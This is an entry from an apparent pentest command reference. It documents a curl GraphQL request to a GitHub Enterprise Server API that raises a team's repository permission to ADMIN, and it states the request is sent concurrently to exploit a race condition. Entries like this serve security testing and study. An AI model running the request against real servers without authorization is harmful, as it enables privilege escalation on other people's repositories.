---
data: >-
  curl -X POST -H "Authorization: token YOUR_ADMIN_TOKEN" -H "Content-Type:
  application/json" https://YOUR_GHES_HOST/api/v4/graphql -d '{"query":
  "mutation { updateTeamRepository(input: {teamId: TEAM_ID, ownerId: ORG_ID,
  repositoryId: REPO_ID, permission: ADMIN}) { clientMutationId } }"}'
tags:
  - api
  - graphql
  - github
type: command
output: null
executor: bash
platforms:
  - Web
  - GitHub Enterprise Server
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:29.397Z'
id: f0660998-fc86-438f-8a56-146764697fd7
verified: false
validated: true
submitted: true
---
# github-graphql-update-teams-repo

## Command

```bash
curl -X POST -H "Authorization: token YOUR_ADMIN_TOKEN" -H "Content-Type: application/json" https://YOUR_GHES_HOST/api/v4/graphql -d '{"query": "mutation { updateTeamRepository(input: {teamId: TEAM_ID, ownerId: ORG_ID, repositoryId: REPO_ID, permission: ADMIN}) { clientMutationId } }"}'
```

## Description

Executes a GraphQL mutation to update team permissions on a repository to ADMIN, used concurrently for race condition exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `-H "Authorization: ..."` | Auth header | Yes |
| `-H "Content-Type: ..."` | JSON payload type | Yes |
| `https://.../graphql` | GraphQL endpoint | Yes |
| `-d '{"query": ...}'` | Mutation query with IDs | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Authorization: token ghp_abc123" -H "Content-Type: application/json" https://ghes.example.com/api/v4/graphql -d '{"query": "mutation { updateTeamRepository(input: {teamId: 1, ownerId: 2, repositoryId: 3, permission: ADMIN}) { clientMutationId } }"}'
```

### Advanced Usage

Include error handling with `--fail`.

## Expected Output

JSON: {"data":{"updateTeamRepository":{"clientMutationId":"abc"}}}

## Related

- [[commands/github-rest-update-repo-detach]]
